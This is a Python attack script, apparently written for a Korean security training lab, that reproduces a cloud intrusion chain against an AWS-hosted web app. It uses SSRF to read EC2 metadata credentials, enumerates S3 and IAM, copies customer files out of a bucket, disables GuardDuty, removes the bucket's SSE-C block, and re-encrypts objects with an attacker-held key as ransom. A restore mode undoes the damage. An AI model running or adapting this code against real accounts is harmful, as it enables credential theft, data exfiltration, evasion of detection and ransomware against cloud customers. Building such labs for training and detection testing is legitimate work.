from __future__ import annotations

import argparse
import base64
import datetime as dt
import json
import os
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))  # attack/ 를 import 경로에 추가

import common
from common import DENY, WhsClient, aws, banner, mask, parse_imds_credentials

LOG = None  # main에서 초기화

# IMDSv1 경로들
CRED_PATH = "/latest/meta-data/iam/security-credentials/"
DOC_PATH = "/latest/dynamic/instance-identity/document"

# 4. 유출 대상 파일들
EXFIL_FILES = ["customers.csv", "config.json", "flag.txt"]

# 7. 복구 자료 파일명 (scenario1/recovery/ 하위)
KEY_FILE = "ssec.key"
KEY_FILE_B64 = "ssec.key.b64"

# 7. 에서 SSE-C 차단을 풀기 전의 버킷 암호화 설정 (원복용)
ENC_FILE = "bucket_encryption_before.json"

# 6. 에서 끄기 전의 GuardDuty 상태 (원복용)
GD_FILE = "guardduty_before.json"


# ─────────────────────────────────────────────────────────────
# 1. SSRF → 임시 자격증명
# ─────────────────────────────────────────────────────────────
def step1_ssrf_credentials(c: WhsClient) -> tuple[str, dict, dict]:
    banner(LOG, "STEP 1 — SSRF(T1190) → 임시 자격증명 탈취")

    raw_role = c.imds(CRED_PATH)
    if "{" in raw_role or "AccessDenied" in raw_role:
        raise SystemExit(f"[!] 중단: Role 이름 조회 실패 (IMDSv2 required 의심): {raw_role[:200]!r}")
    role = raw_role.strip().splitlines()[0].strip()
    if not role:
        raise SystemExit("[!] 중단: IMDS 가 role 이름을 비워서 응답")
    LOG.info("  [+] SSRF 로 IMDS 도달. EC2 role = %s", role)

    creds = parse_imds_credentials(c.imds(CRED_PATH + role))
    LOG.info("  [+] 임시 자격증명 탈취(ASIA…): AccessKeyId=%s", mask(creds["AccessKeyId"], 8))
    LOG.info("      Expiration=%s", creds.get("Expiration"))

    doc = json.loads(c.imds(DOC_PATH))
    LOG.info("  [+] instance-identity: account=%s region=%s instance=%s",
             doc.get("accountId"), doc.get("region"), doc.get("instanceId"))
    return role, creds, doc


def boto3_session(creds: dict, region: str):
    """
    탈취한 자격증명으로 boto3 세션 생성.

    Token 이 있으면 임시 자격증명(ASIA…), 없으면 장기 키(AKIA…)로 본다.
    6·7 은 5 에서 확보한 장기 키 세션으로 도는데, 그러면 CloudTrail 에
    principal 이 바뀐 채로 찍혀서 탐지 측이 '자격증명 전환'을 볼 수 있다.
    """
    import boto3
    return boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds.get("Token"),
        region_name=region,
    )


# ─────────────────────────────────────────────────────────────
# 3. 정찰 (T1580)
# ─────────────────────────────────────────────────────────────
def step3_discovery(sess) -> list[str]:
    banner(LOG, "STEP 3 — 정찰(T1580): S3/STS/IAM 리소스 열거")

    who = aws(LOG, "sts:GetCallerIdentity", sess.client("sts").get_caller_identity)
    LOG.info("  [+] sts:GetCallerIdentity Arn=%s", who.get("Arn"))

    s3 = sess.client("s3")
    buckets = [b["Name"] for b in aws(LOG, "s3:ListBuckets", s3.list_buckets)["Buckets"]]
    LOG.info("  [+] s3:ListAllMyBuckets — %d개", len(buckets))
    for b in buckets:
        LOG.info("      - %s", b)

    # iam:* 는 권한경계가 명시적 Deny (확정 사실). 차단 자체가 CloudTrail 탐지 증거다.
    res = aws(LOG, "iam:ListUsers", sess.client("iam").list_users, expect=(DENY,))
    if res is not None:
        LOG.warning("  [!] iam:ListUsers 가 성공했다 — 권한경계가 기대와 다름 (%d명)",
                    len(res.get("Users", [])))
    return buckets


# ─────────────────────────────────────────────────────────────
# 4. 수집·유출 (T1530 / T1537)
# ─────────────────────────────────────────────────────────────
def step4_exfil(sess, bucket: str, prefix: str) -> dict:
    banner(LOG, "STEP 4 — S3 데이터 수집·유출(T1530/T1537)")
    outdir = HERE / "exfiltrated"
    outdir.mkdir(exist_ok=True)

    s3 = sess.client("s3")
    got = {}
    for fname in EXFIL_FILES:
        key = f"{prefix.rstrip('/')}/{fname}"
        label = f"s3:GetObject s3://{bucket}/{key}"
        # 대상 파일이 아직 안 심겨 있을 수 있다 → NoSuchKey 는 예상된 결과로 통과.
        obj = aws(LOG, label, s3.get_object, Bucket=bucket, Key=key,
                  expect=("NoSuchKey", DENY))
        if obj is None:
            continue
        body = obj["Body"].read()
        (outdir / fname).write_bytes(body)
        got[fname] = body
        LOG.info("  [+] 유출: s3://%s/%s (%d bytes) → exfiltrated/%s",
                 bucket, key, len(body), fname)

    LOG.info("  [=] 유출 %d/%d 파일", len(got), len(EXFIL_FILES))
    return got


# ─────────────────────────────────────────────────────────────
# 5. 장기 자격증명 확보 (config.json → AKIA)
# ─────────────────────────────────────────────────────────────
def longterm_creds() -> dict | None:
    """
    6·7 에 쓸 장기 자격증명을 .env 에서 읽는다.

    S3 의 config.json 에는 가상의 값만 넣어둔다(실제 키를 S3 객체로 두지 않으려고).
    config.json 유출 성공을 장기키 탈취로 치고, 실제 호출에 쓰는 키는 .env 에서 온다.
    """
    akid = common.env("PERSIST_AWS_ACCESS_KEY_ID")
    secret = common.env("PERSIST_AWS_SECRET_ACCESS_KEY")
    if not akid or not secret:
        return None
    return {"AccessKeyId": akid, "SecretAccessKey": secret}


def restore_session(region: str):
    """
    복구 전용 자격증명으로 세션을 만든다.

    공격에 쓰는 장기키(PERSIST_AWS_*)와는 **다른 IAM User** 다.
    복구는 공격자가 아니라 실습 운영자가 하는 일이고, CloudTrail 에서도
    공격 행위와 뒷정리가 다른 principal 로 구분돼야 한다.
    """
    import boto3
    sess = boto3.Session(
        aws_access_key_id=common.need_env("RESTORE_AWS_ACCESS_KEY_ID"),
        aws_secret_access_key=common.need_env("RESTORE_AWS_SECRET_ACCESS_KEY"),
        region_name=region,
    )
    who = aws(LOG, "sts:GetCallerIdentity(복구용)",
              sess.client("sts").get_caller_identity)
    LOG.info("[restore] 복구 전용 자격증명 — Arn=%s", who.get("Arn"))
    return sess


def use_longterm(creds: dict, region: str):
    """
    장기 자격증명으로 세션을 만들고 누구로 전환됐는지 확인한다.

    GetCallerIdentity 는 IAM 권한 없이도 되므로, 여기서 실패하면 키 자체가
    틀린 것이다 → 재암호화를 시작하기 전에 멈춘다(fail-fast).
    """
    sess = boto3_session(creds, region)
    who = aws(LOG, "sts:GetCallerIdentity(장기키)",
              sess.client("sts").get_caller_identity)
    LOG.info("  [+] 자격증명 전환 완료 — Arn=%s", who.get("Arn"))
    return sess


def step5_longterm_creds(exfiltrated: dict) -> dict | None:
    """
    config.json 유출에 성공했으면 장기 자격증명을 확보한 것으로 보고 반환한다.
    반환값이 있으면 main 이 6·7 을 이 키의 세션으로 돌린다.
    """
    banner(LOG, "STEP 5 — 장기 자격증명(AKIA) 확보")

    body = exfiltrated.get("config.json")
    if not body:
        LOG.info("  config.json 미확보 — 5 생략 (버킷에 심긴 뒤 재실행)")
        return None

    cfg = json.loads(body)  # 유출은 됐는데 JSON이 아니면 예상 밖 → 즉시 종료
    # config.json 안의 값은 서사용 더미다. 키 이름이 스네이크/파스칼 어느 쪽이든
    # '무엇이 적혀 있었는지'만 로그에 남기고, 실제 호출에는 쓰지 않는다.
    shown = cfg.get("aws_access_key_id") or cfg.get("AccessKeyId")
    LOG.info("  [+] config.json 탈취 — 내부 장기 자격증명(더미) AccessKeyId=%s",
             mask(shown, 6) if shown else "<표기 없음>")

    creds = longterm_creds()
    if creds is None:
        LOG.warning("  [!] .env 에 PERSIST_AWS_ACCESS_KEY_ID / PERSIST_AWS_SECRET_ACCESS_KEY "
                    "가 없다 — 6·7 은 2단계의 임시 자격증명으로 진행한다.")
        LOG.warning("      (임시키는 역할 권한이라 GuardDuty/PutObject 가 Deny 될 수 있다)")
        return None

    LOG.info("  [+] 장기 자격증명 확보: AccessKeyId=%s", mask(creds["AccessKeyId"], 6))
    LOG.info("      → 임시키 만료(역할 최대 세션 1시간) 후에도 접근이 유지되는 지속성 확보")
    LOG.info("      → 이후 6·7 은 이 키로 실행 — CloudTrail 에 principal 이 바뀌어 찍힌다")
    return creds


# ─────────────────────────────────────────────────────────────
# 6. GuardDuty 비활성화 (T1562.008)
# ─────────────────────────────────────────────────────────────
def step6_disable_guardduty(sess) -> bool:
    """
    탐지를 끈다. 계정 전체에 영향이 가고 자동 복구가 없으므로,
    실제로 꺼졌으면 True 를 돌려서 종료 시 재활성화를 다시 안내한다.
    """
    banner(LOG, "STEP 6 — GuardDuty 비활성화(T1562.008)")
    detector = common.need_env("GUARDDUTY_DETECTOR_ID")
    gd = sess.client("guardduty")

    # 끄기 전 상태를 남긴다. --restore 가 이 기록을 보고 되돌리며,
    # 원래 꺼져 있었다면 켜지 않는다(우리가 끈 것만 되돌린다).
    cur = aws(LOG, "guardduty:GetDetector", gd.get_detector,
              DetectorId=detector, expect=(DENY,))
    before = (cur or {}).get("Status", "UNKNOWN")
    common.save_recovery(
        HERE, GD_FILE,
        json.dumps({"detector_id": detector, "before": before,
                    "region": sess.region_name,
                    "at_utc": dt.datetime.now(dt.timezone.utc).isoformat(),
                    "restore_cmd": "python scenario1.py --restore"},
                   indent=2, ensure_ascii=False).encode())
    LOG.info("  [+] 변경 전 상태 저장: recovery/%s (before=%s)", GD_FILE, before)

    LOG.warning("  [!] detector=%s 를 Enable=False 로 전환 시도", detector)
    res = aws(LOG, "guardduty:UpdateDetector", gd.update_detector,
              DetectorId=detector, Enable=False, expect=(DENY,))
    if res is None:
        LOG.info("      → 차단됨. AccessDenied 가 CloudTrail 탐지 증거로 남는다.")
        return False

    LOG.warning("  [+] GuardDuty 비활성화 성공 — 탐지가 실제로 멈췄다.")
    LOG.warning("      복구(필수): aws guardduty update-detector "
                "--detector-id %s --enable --region %s",
                detector, sess.region_name)
    return True


# ─────────────────────────────────────────────────────────────
# 7. SSE-C 재암호화 랜섬 (T1486) — --ransom
# ─────────────────────────────────────────────────────────────
def _list_targets(s3, bucket: str, prefix: str) -> list[str]:
    """prefix 하위 객체 키 목록. 열거 실패는 예상 밖이므로 즉시 종료."""
    def _run():
        keys = []
        paginator = s3.get_paginator("list_objects_v2")
        for page in paginator.paginate(Bucket=bucket, Prefix=prefix):
            for obj in page.get("Contents", []):
                if not obj["Key"].endswith("/"):  # 디렉터리 플레이스홀더 제외
                    keys.append(obj["Key"])
        return keys

    return aws(LOG, f"s3:ListObjectsV2 s3://{bucket}/{prefix}", _run)


def _prepare_ssec_key(bucket: str, prefix: str, targets: list[str]) -> bytes:
    """
    SSE-C 키를 확보하고 로컬에 저장·검증한 뒤 반환한다.

    정상 반환했다면 키가 recovery/ 에 확실히 있다. 저장이나 검증에 실패하면
    예외가 나가서 호출부가 한 객체도 암호화하지 못한다.
    """
    b64 = common.env("SSEC_KEY_B64")
    if b64:
        try:
            key = base64.b64decode(b64, validate=True)
        except Exception as e:
            raise SystemExit(f"[!] 중단: SSEC_KEY_B64 디코드 실패 — {e}")
        source = ".env SSEC_KEY_B64"
    else:
        key = os.urandom(32)
        source = "os.urandom(32) 신규 생성"

    if len(key) != 32:
        raise SystemExit(f"[!] 중단: SSE-C 키는 32바이트여야 함 (현재 {len(key)})")

    meta = {
        "scenario": "scenario1 7단계 SSE-C 재암호화 (T1486)",
        "key_source": source,
        "algorithm": "AES256 (SSE-C)",
        "bucket": bucket,
        "prefix": prefix,
        "targets_listed": targets,
        "created_utc": dt.datetime.now(dt.timezone.utc).isoformat(),
        "restore_cmd": "python scenario1.py --restore",
        "note": "이 키가 없으면 대상 객체를 되돌릴 수 없다. 삭제·커밋 금지.",
    }
    # 저장 실패 시 예외 → 암호화 시작 전에 멈춘다.
    key_path = common.save_recovery(HERE, KEY_FILE, key, meta=meta)
    common.save_recovery(HERE, KEY_FILE_B64, base64.b64encode(key) + b"\n")

    LOG.info("  [+] SSE-C 키 확보(%s) 및 로컬 저장·검증 완료", source)
    LOG.info("      키 파일 : %s", key_path)
    LOG.info("      메타    : %s.meta.json (대상 목록·복구 명령 포함)", key_path)
    LOG.info("      복구    : python scenario1.py --restore")
    return key


def _unblock_ssec(s3, bucket: str) -> bool:
    """
    버킷의 SSE-C 차단을 공격자 권한으로 해제한다 (T1562.001).

    버킷 기본 암호화 설정이 SSE-C 를 막고 있으면 재암호화가 실패한다.
    장기키에 s3:PutEncryptionConfiguration 이 있으면 공격이 스스로 푼다.
    콘솔에서 미리 풀어두는 것보다 이쪽이 낫다 — PutBucketEncryption 이
    CloudTrail 관리 이벤트로 남아 증거가 된다.

    변경 전 설정을 recovery/ 에 저장한 뒤에만 바꾼다. 반환값은 해제 여부.
    """
    cur = aws(LOG, "s3:GetBucketEncryption", s3.get_bucket_encryption, Bucket=bucket)
    conf = cur["ServerSideEncryptionConfiguration"]

    blocked = [t for r in conf.get("Rules", [])
               for t in r.get("BlockedEncryptionTypes", {}).get("EncryptionType", [])]
    LOG.info("  [+] 현재 차단된 암호화 유형 = %s", blocked or "(없음)")
    if "SSE-C" not in blocked:
        LOG.info("      SSE-C 차단 없음 — 해제 단계 생략")
        return False

    # 원복 자료 먼저. 저장에 실패하면 버킷 설정을 건드리지 않는다.
    common.save_recovery(
        HERE, ENC_FILE,
        json.dumps({"bucket": bucket, "before": conf,
                    "at_utc": dt.datetime.now(dt.timezone.utc).isoformat(),
                    "restore_cmd": "python scenario1.py --restore"},
                   indent=2, ensure_ascii=False, default=str).encode())
    LOG.info("      변경 전 설정 저장: recovery/%s", ENC_FILE)

    LOG.warning("  [!] SSE-C 차단 해제 시도 (T1562.001) — 버킷 보안 설정 변경")

    # 차단을 푸는 방법은 BlockedEncryptionTypes 를 ["NONE"] 으로 덮어쓰는 것이다.
    # 필드를 빼면 PUT 이 200 을 주고도 차단이 그대로 남고(실측),
    # 빈 목록은 InvalidArgument 로 거부된다("must contain at least one encryption type").
    rules = [{**r, "BlockedEncryptionTypes": {"EncryptionType": ["NONE"]}}
             for r in conf.get("Rules", [])]
    res = aws(LOG, "s3:PutBucketEncryption", s3.put_bucket_encryption,
              Bucket=bucket,
              ServerSideEncryptionConfiguration={"Rules": rules},
              expect=(DENY,))
    if res is None:
        raise SystemExit(
            "[!] 중단: SSE-C 차단 해제가 거부됐다. 장기키에 "
            "s3:PutEncryptionConfiguration 이 대상 버킷 ARN 으로 필요하다.")

    # PUT 이 200 을 줘도 실제로 풀렸는지 되읽어 확인한다. 차단이 남은 채로 SSE-C 를
    # 쓰면 S3 가 AccessDenied 를 주는데, 권한 거부와 에러 코드가 같아 원인을 못 찾는다.
    for _ in range(5):
        cur2 = aws(LOG, "s3:GetBucketEncryption(확인)",
                   s3.get_bucket_encryption, Bucket=bucket)
        still = [t for r in cur2["ServerSideEncryptionConfiguration"].get("Rules", [])
                 for t in r.get("BlockedEncryptionTypes", {}).get("EncryptionType", [])]
        if "SSE-C" not in still:
            LOG.warning("  [+] SSE-C 차단 해제 확인됨 — 실습 후 원복 필요(--restore)")
            return True
        time.sleep(1)

    raise SystemExit(
        "[!] 중단: PutBucketEncryption 이 성공했는데도 SSE-C 차단이 남아 있다.\n"
        "    이 상태로 재암호화하면 전부 AccessDenied 가 나므로 진행하지 않는다.")


def _restore_guardduty(sess) -> None:
    """
    6단계에서 끈 GuardDuty 를 되살린다.

    끄기 전 상태를 기록해 두고 그게 ENABLED 였을 때만 켠다.
    원래 꺼져 있던 걸 우리가 켜버리면 그것도 환경을 바꾸는 것이다.
    """
    path = HERE / "recovery" / GD_FILE
    if not path.exists():
        LOG.info("  [i] GuardDuty 변경 기록 없음 — 복원 생략")
        return
    rec = json.loads(path.read_text(encoding="utf-8"))
    if rec.get("before") != "ENABLED":
        LOG.info("  [i] 끄기 전에도 ENABLED 가 아니었다(before=%s) — 그대로 둔다",
                 rec.get("before"))
        common.clear_recovery(HERE, GD_FILE)
        return

    detector = rec["detector_id"]
    res = aws(LOG, "guardduty:UpdateDetector(복원)",
              sess.client("guardduty").update_detector,
              DetectorId=detector, Enable=True, expect=(DENY,))
    if res is None:
        LOG.warning("  [!] GuardDuty 재활성화가 거부됐다 — 콘솔에서 직접 켤 것:")
        LOG.warning("      aws guardduty update-detector --detector-id %s "
                    "--enable --region %s", detector, sess.region_name)
        return

    chk = aws(LOG, "guardduty:GetDetector(확인)",
              sess.client("guardduty").get_detector,
              DetectorId=detector, expect=(DENY,))
    status = (chk or {}).get("Status", "확인 불가")
    LOG.info("  [+] GuardDuty 재활성화 완료 — Status=%s", status)
    # ENABLED 를 확인했을 때만 기록을 지운다. 확인 못 했으면 미복구로 남겨
    # 다음 실행이 막히게 한다.
    if status == "ENABLED":
        common.clear_recovery(HERE, GD_FILE)


def _restore_bucket_encryption(sess, bucket: str) -> None:
    """7 에서 푼 SSE-C 차단을 원래 설정으로 되돌린다."""
    path = HERE / "recovery" / ENC_FILE
    if not path.exists():
        LOG.info("  [i] 암호화 설정 변경 기록 없음 — 복원 생략")
        return
    before = json.loads(path.read_text(encoding="utf-8"))["before"]
    res = aws(LOG, "s3:PutBucketEncryption", sess.client("s3").put_bucket_encryption,
              Bucket=bucket,
              ServerSideEncryptionConfiguration={"Rules": before.get("Rules", [])},
              expect=(DENY,))
    if res is None:
        LOG.warning("  [!] 암호화 설정 원복 거부됨 — 콘솔에서 SSE-C 차단을 수동 복원할 것")
        return
    common.clear_recovery(HERE, ENC_FILE)
    LOG.info("  [+] 버킷 암호화 설정 원복 완료 (SSE-C 차단 복원)")


def step7_ssec_ransom(sess, bucket: str, prefix: str) -> None:
    """
    Codefinger 2025 수법 재현: 공격자가 제공한 SSE-C 키로 객체를 재암호화(copy)해
    가용성을 침해(T1486). 키를 모르면 피해자는 복호 불가 → 랜섬.

    실습 안전장치는 모듈 docstring의 '7 재암호화 안전장치 (3중)' 참조.
    """
    banner(LOG, "STEP 7 — SSE-C 재암호화 랜섬(T1486)")
    s3 = sess.client("s3")

    # 버저닝은 '있으면 좋은' 2차 수단일 뿐이다.
    # 복구의 본체는 recovery/ssec.key 다 — --restore 가 CopySourceSSECustomerKey 로
    # 되돌리며 버전 이력을 쓰지 않는다. 그래서 미활성이어도 중단하지 않고 경고만 한다.
    ver = aws(LOG, "s3:GetBucketVersioning", s3.get_bucket_versioning,
              Bucket=bucket, expect=(DENY,))
    status = (ver or {}).get("Status") or "Disabled"
    LOG.info("  [+] 버킷 버저닝 상태 = %s", status if ver is not None else "확인 불가(권한 없음)")
    if status != "Enabled":
        LOG.warning("  [!] 버저닝 미활성 — 이전 버전 롤백 경로가 없다.")
        LOG.warning("      복구는 recovery/%s 에 전적으로 의존한다. 이 파일을 잃지 말 것.", KEY_FILE)

    targets = _list_targets(s3, bucket, prefix)
    LOG.info("  [+] 재암호화 대상 %d개 (s3://%s/%s)", len(targets), bucket, prefix)
    for k in targets[:20]:
        LOG.info("      - %s", k)
    if not targets:
        LOG.info("  대상 객체 없음 — 7 생략")
        return

    # (안전망 1) 키를 로컬에 저장·검증한 뒤에만 아래로 내려간다.
    ssec_key = _prepare_ssec_key(bucket, prefix, targets)

    # 안전 점검을 모두 통과한 뒤에 버킷 설정을 건드린다.
    # (먼저 풀었다가 키 저장에 실패하면 보안만 낮추고 끝나는 꼴이 된다)
    _unblock_ssec(s3, bucket)

    LOG.warning("  [!] 재암호화 시작 — 이후 이 객체들은 키 없이 읽을 수 없다.")
    done, denied = [], []
    for key in targets:
        label = f"s3:CopyObject(SSE-C) s3://{bucket}/{key}"
        res = aws(LOG, label, s3.copy_object,
                  Bucket=bucket, Key=key,
                  CopySource={"Bucket": bucket, "Key": key},
                  SSECustomerAlgorithm="AES256",
                  SSECustomerKey=ssec_key,
                  MetadataDirective="COPY",
                  expect=(DENY,))
        if res is None:
            denied.append(key)
            continue
        done.append(key)
        LOG.info("  [+] 재암호화 완료: s3://%s/%s", bucket, key)

    # 실제로 잠긴 목록을 복구 메타에 반영 — --restore 가 이 목록을 대상으로 삼는다.
    common.save_recovery(HERE, "encrypted_objects.json",
                         json.dumps({"bucket": bucket, "prefix": prefix,
                                     "encrypted": done, "denied": denied,
                                     "at_utc": dt.datetime.now(dt.timezone.utc).isoformat()},
                                    indent=2, ensure_ascii=False).encode())

    LOG.info("  [=] 재암호화 %d개 / 차단 %d개", len(done), len(denied))
    if denied:
        LOG.info("      차단된 %d개는 PutObject Deny — CloudTrail 탐지 증거", len(denied))
    if done:
        LOG.warning("      복구: python scenario1.py --restore  (키: recovery/%s)", KEY_FILE)


# ─────────────────────────────────────────────────────────────
# 7-R 원상복구 — --restore
# ─────────────────────────────────────────────────────────────
def step7_restore(sess, bucket: str, prefix: str) -> None:
    """
    저장된 SSE-C 키로 객체를 평문으로 되돌린다.

    copy_object 주의: 소스 복호에만 CopySourceSSECustomer* 를 주고 목적지에는
    SSE-C 파라미터를 주지 않는다. 주면 같은 키로 다시 암호화된다.
    """
    banner(LOG, "RESTORE — SSE-C 재암호화 원상복구")
    key_bytes = common.load_recovery(HERE, KEY_FILE)
    if len(key_bytes) != 32:
        raise SystemExit(f"[!] 중단: 저장된 키가 32바이트가 아님 ({len(key_bytes)})")
    LOG.info("  [+] 저장된 SSE-C 키 로드: recovery/%s", KEY_FILE)

    # 암호화 기록이 있으면 그 목록을, 없으면 prefix 전체를 대상으로 한다.
    manifest = HERE / "recovery" / "encrypted_objects.json"
    s3 = sess.client("s3")
    if manifest.exists():
        targets = json.loads(manifest.read_text(encoding="utf-8"))["encrypted"]
        LOG.info("  [+] 암호화 기록에서 대상 %d개 확인", len(targets))
    else:
        targets = _list_targets(s3, bucket, prefix)
        LOG.info("  [i] 암호화 기록 없음 — prefix 전체 %d개 대상", len(targets))

    # 복구 경로는 aws() 를 쓰지 않는다:
    #   - 한 객체가 실패해도 나머지는 계속 복구해야 한다(중간에 죽으면 안 됨)
    #   - 그렇다고 실패를 '예상된 차단'으로 조용히 넘기면 안 된다. 키가 틀린 경우에도
    #     S3 는 403 을 주므로, AccessDenied 를 묵인하면 "복구된 줄 알았는데 아닌" 상태가 된다.
    # → 전부 시도하고, 실패가 하나라도 있으면 마지막에 0 아닌 종료코드로 알린다.
    restored, failed = [], []
    for key in targets:
        try:
            s3.copy_object(
                Bucket=bucket, Key=key,
                CopySource={"Bucket": bucket, "Key": key},
                CopySourceSSECustomerAlgorithm="AES256",
                CopySourceSSECustomerKey=key_bytes,
                MetadataDirective="COPY",
                # 목적지에는 SSE-C 파라미터를 주지 않는다 → 평문으로 재저장
            )
        except Exception as e:
            failed.append(key)
            LOG.warning("  [FAIL] 복구 실패 s3://%s/%s → %s", bucket, key, common.err_str(e))
            continue
        restored.append(key)
        LOG.info("  [+] 평문 복구: s3://%s/%s", bucket, key)

    LOG.info("  [=] 복구 %d개 / 실패 %d개", len(restored), len(failed))
    if failed:
        LOG.warning("  [!] 복구되지 않은 객체 %d개 — 남은 수단:", len(failed))
        LOG.warning("      1) 키 확인: recovery/%s 가 암호화 당시 키인지 (meta.json 의 created_utc)",
                    KEY_FILE)
        LOG.warning("      2) 버저닝 롤백: aws s3api list-object-versions "
                    "--bucket %s --prefix %s", bucket, prefix)
        # 객체 복구가 끝나지 않았는데 SSE-C 차단을 되살리면 남은 객체를 못 되돌린다.
        raise SystemExit(f"[!] 복구 미완료: {len(failed)}개 — 위 절차로 확인 필요")

    # 전부 되돌렸으니 '잠긴 객체 있음' 표시를 지운다. 이게 남아 있으면
    # 다음 공격 실행이 미복구로 판단해 막히고, --restore 재실행도 이미 평문인
    # 객체에 복호를 시도해 실패로 집계된다.
    common.clear_recovery(HERE, "encrypted_objects.json", "encrypted")

    # 객체를 전부 되돌린 뒤에 버킷 암호화 설정(SSE-C 차단)을 원복한다.
    _restore_bucket_encryption(sess, bucket)


# ─────────────────────────────────────────────────────────────
# main
# ─────────────────────────────────────────────────────────────
def main():
    global LOG
    ap = argparse.ArgumentParser(
        description="scenario1 — SSRF→임시자격증명→S3 유출→GuardDuty 무력화→SSE-C 랜섬")
    ap.add_argument("--restore", action="store_true",
                    help="7단계를 원상복구 (recovery/ssec.key 로 평문화). 다른 단계는 건너뜀")
    args = ap.parse_args()

    common.load_env(HERE)
    LOG = common.get_logger(HERE, "scenario1")
    banner(LOG, "SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬",
           "Capital One 2019 / Codefinger 2025 재현 (WHS 실습)")

    bucket = common.need_env("DATA_BUCKET")
    prefix = common.env("DATA_PREFIX", "whs-data/")

    if not args.restore:
        # 되돌리지 않은 채 다시 공격하면 SSE-C 키와 GuardDuty 이전 상태를 덮어써
        # 원래대로 못 돌아간다. 그래서 진입 시점에 막는다.
        common.require_restored(
            LOG, HERE, "python scenario1.py --restore",
            [("encrypted_objects.json", "encrypted", "SSE-C 로 잠긴 S3 객체가 남아 있다"),
             ("bucket_encryption_before.json", None, "버킷 SSE-C 차단이 풀린 채다"),
             (GD_FILE, None, "GuardDuty 가 꺼진 채일 수 있다")])

    if args.restore:
        # 복구는 공격이 아니다. 웹앱을 건드리지 않고(SSRF·로그인 없음)
        # 복구 전용 자격증명으로 AWS API 만 호출한다.
        restore_sess = restore_session(
            common.env("RESTORE_AWS_REGION", "ap-northeast-2"))
        # 객체 복구가 실패해도 탐지는 되살린다. 그래서 finally 로 감싼다.
        try:
            step7_restore(restore_sess, bucket, prefix)
        finally:
            _restore_guardduty(restore_sess)
        banner(LOG, "SCENARIO 1 복구 종료", "로그: scenario1/scenario1.log")
        return

    base = common.env("WEBAPP_URL", "https://whs4namu.click")
    c = WhsClient(base, LOG)
    c.login_normal(common.need_env("WHS_LOGIN_EMAIL"),
                   common.need_env("WHS_LOGIN_PASSWORD"))

    # 1·2 SSRF → 임시 자격증명
    role, creds, doc = step1_ssrf_credentials(c)
    region = doc["region"]
    sess = boto3_session(creds, region)

    # 3~5 — 읽기 전용, 플래그 없이 실행
    step3_discovery(sess)
    exfiltrated = step4_exfil(sess, bucket, prefix)
    longterm = step5_longterm_creds(exfiltrated)

    # 6·7 은 5 에서 장기키를 확보했으면 그 세션으로 돈다.
    # 확보 못 했으면 임시키로 계속한다(차단되면 그 자체가 CloudTrail 증거).
    adm = use_longterm(longterm, region) if longterm else sess

    # 6·7 은 흐름도 순서대로 항상 실행한다. 탐지를 먼저 끄고 랜섬을 거는 것이
    # 실제 공격 순서이고, 복구 경로(--restore + GuardDuty 재활성화)가 갖춰져 있다.
    gd_off = step6_disable_guardduty(adm)
    step7_ssec_ransom(adm, bucket, prefix)

    banner(LOG, "SCENARIO 1 종료", "로그: scenario1/scenario1.log")

    # 실습 후 되돌리는 방법을 마지막에 한 번 더 찍는다.
    LOG.warning("")
    LOG.warning("[원상복구]  python scenario1.py --restore")
    LOG.warning("  객체 평문화 + SSE-C 차단 복원%s 을 한 번에 수행한다.",
                " + GuardDuty 재활성화" if gd_off else "")


if __name__ == "__main__":
    main()
